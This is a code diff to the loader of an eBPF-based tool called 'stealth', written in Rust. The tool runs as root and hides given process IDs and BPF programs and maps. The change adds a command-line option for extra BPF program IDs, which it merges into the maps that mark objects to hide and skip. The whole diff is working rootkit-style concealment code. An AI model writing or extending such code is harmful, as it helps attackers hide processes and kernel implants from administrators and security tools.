@@ -7,8 +7,8 @@ use aya::{
 use clap::Parser;
 use log::{debug, info, warn};
 use stealth::utils::{
-    fetch_prog_ids_map_ids, get_descendants, list_active_maps, list_active_programs,
-    write_to_tracefs, Builder, HiddenPid, SyscallTracepoint,
+    fetch_progs_ids_map_ids, get_descendants, get_progs_info_from_progs_ids, list_active_maps,
+    list_active_programs, write_to_tracefs, Builder, HiddenPid, SyscallTracepoint,
 };
 use stealth_common::MAX_BPF_OBJ;
 use sysinfo::{Pid, ProcessesToUpdate, System};
@@ -18,11 +18,13 @@ use tokio::signal;
 struct Opt {
     #[clap(long, value_delimiter = ',', required = true)]
     pid: Vec<String>,
+    #[clap(long, value_delimiter = ',', required = false)]
+    bpf_prog_id: Vec<u32>,
 }
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
-    let Opt { pid } = Opt::parse();
+    let Opt { pid, bpf_prog_id } = Opt::parse();
     env_logger::init();
 
     if unsafe { libc::geteuid() } != 0 {
@@ -56,9 +58,12 @@ async fn main() -> anyhow::Result<()> {
         tracepoints,
     };
 
-    let self_progs_info = builder.build()?;
+    let mut bpf_progs_info = builder.build()?;
 
-    let self_bpf_info = fetch_prog_ids_map_ids(self_progs_info)?;
+    // add provided prog_info
+    bpf_progs_info.append(&mut get_progs_info_from_progs_ids(bpf_prog_id));
+
+    let full_bpf_info = fetch_progs_ids_map_ids(bpf_progs_info)?;
 
     //setup HIDDEN_PIDS MAP
     let mut hidden_pids_array: Array<_, HiddenPid> =
@@ -68,11 +73,11 @@ async fn main() -> anyhow::Result<()> {
     let mut hidden_obj_map: HashMap<_, u32, [u32; MAX_BPF_OBJ as usize]> =
         HashMap::try_from(ebpf.take_map("HIDDEN_BPF_OBJ").unwrap()).unwrap();
     let mut hidden_progs = [0u32; MAX_BPF_OBJ as usize];
-    for (idx, m) in self_bpf_info.prog_ids.iter().enumerate() {
+    for (idx, m) in full_bpf_info.prog_ids.iter().enumerate() {
         hidden_progs[idx] = *m
     }
     let mut hidden_maps = [0u32; MAX_BPF_OBJ as usize];
-    for (idx, m) in self_bpf_info.map_ids.iter().enumerate() {
+    for (idx, m) in full_bpf_info.map_ids.iter().enumerate() {
         hidden_maps[idx] = *m
     }
 
@@ -84,8 +89,8 @@ async fn main() -> anyhow::Result<()> {
         HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
     let mut map_skip_map: HashMap<_, u32, u32> =
         HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();
-    let prog_ids = self_bpf_info.prog_ids;
-    let map_ids = self_bpf_info.map_ids;
+    let prog_ids = full_bpf_info.prog_ids;
+    let map_ids = full_bpf_info.map_ids;
 
     for p in prog_ids.clone() {
         info!("bpf prog: {} -> hide", p)
